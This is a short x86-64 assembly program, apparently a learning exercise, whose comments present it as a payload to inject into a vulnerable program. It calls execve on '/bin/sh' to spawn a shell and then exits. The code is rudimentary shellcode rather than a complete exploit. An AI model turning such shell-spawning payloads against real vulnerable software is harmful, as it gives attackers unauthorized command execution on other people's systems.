    ;; This is just a binary code that we can use as a payload
    ;; Extracting these pieces of code can be used as a payload to
    ;;  vuln program 
    section .data
    ;; my constants
    SYS_exit equ 60
    EXIT_SUCCESS equ 0
    SYS_exec equ 59             ; this is sys code to execute a program
    NULL equ 0
    
    ;; This is my program name
    progName db "/bin/sh", NULL ; the name of my program yeah a shell


    section .text
    global _start
_start:
    mov rax, SYS_exec
    mov rdi, progName
    syscall                     ; And I execute this syscall
    
last:
    mov rax, SYS_exit
    mov rdi, EXIT_SUCCESS
    syscall
